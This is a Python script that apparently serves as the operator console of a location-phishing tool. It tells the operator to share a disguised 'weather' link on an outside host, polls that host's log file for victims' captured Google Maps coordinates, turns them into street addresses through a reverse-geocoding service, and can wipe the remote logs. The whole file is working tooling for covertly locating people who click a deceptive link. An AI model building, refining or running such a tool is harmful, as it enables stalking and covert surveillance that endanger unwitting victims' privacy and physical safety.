import requests
import time
import os
import re

RED = "\033[91m"
RESET = "\033[0m"

HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; MyScript/1.0)"}

def extract_coords_from_link(link):
    match = re.search(r'[?&]q=(-?\d+\.\d+),(-?\d+\.\d+)', link)
    if match:
        lat, lng = match.groups()
        return float(lat), float(lng)
    else:
        return None

def coords_to_address(lat, lng):
    url = "https://nominatim.openstreetmap.org/reverse"
    params = {
        "lat": lat,
        "lon": lng,
        "format": "json"
    }
    r = requests.get(url, params=params, headers=HEADERS)
    if r.status_code == 200:
        data = r.json()
        return data.get("display_name", "Address not found")
    else:
        return f"Error fetching address: {r.status_code}"

def fetch_logs():
    base_url = "https://vmpx.top/tools/"
    logs_file = "logs.txt"

    print(RED + "Use this link: https://vmpx.top/tools/weather.php" + RESET)

    while True:
        try:
            r = requests.get(base_url + logs_file, timeout=5)
            if r.status_code == 200 and r.text.strip():
                os.system("cls" if os.name == "nt" else "clear")
                print(RED + "Use this link: https://vmpx.top/tools/weather.php" + RESET)
                print(RED + "Log found!" + RESET)
                log_text = r.text.strip()
                print("\n--- logs.txt ---")
                print(log_text)

                links = re.findall(r'https?://maps\.google\.com/\?q=[^ \n]+', log_text)
                for link in links:
                    coords = extract_coords_from_link(link)
                    if coords:
                        address = coords_to_address(*coords)
                        print(RED + f"\nResolved Address for {link}:\n{address}" + RESET)

                choice = input(RED + "\nPress 'c' to clear logs or Enter to continue: " + RESET).strip().lower()
                if choice == "c":
                    try:
                        requests.post(base_url + logs_file, data="")
                        print(RED + "Logs cleared remotely!" + RESET)
                    except Exception:
                        print(RED + "Failed to clear logs." + RESET)
            else:
                os.system("cls" if os.name == "nt" else "clear")
                print(RED + "Use this link: https://vmpx.top/tools/weather.php" + RESET)
                print(RED + "Waiting for logs..." + RESET)
        except Exception:
            os.system("cls" if os.name == "nt" else "clear")
            print(RED + "Use this link: https://vmpx.top/tools/weather.php" + RESET)
            print(RED + "Waiting for logs..." + RESET)

        time.sleep(5)

if __name__ == "__main__":
    try:
        fetch_logs()
    except KeyboardInterrupt:
        print("\n" + RED + "Stopped by user." + RESET)
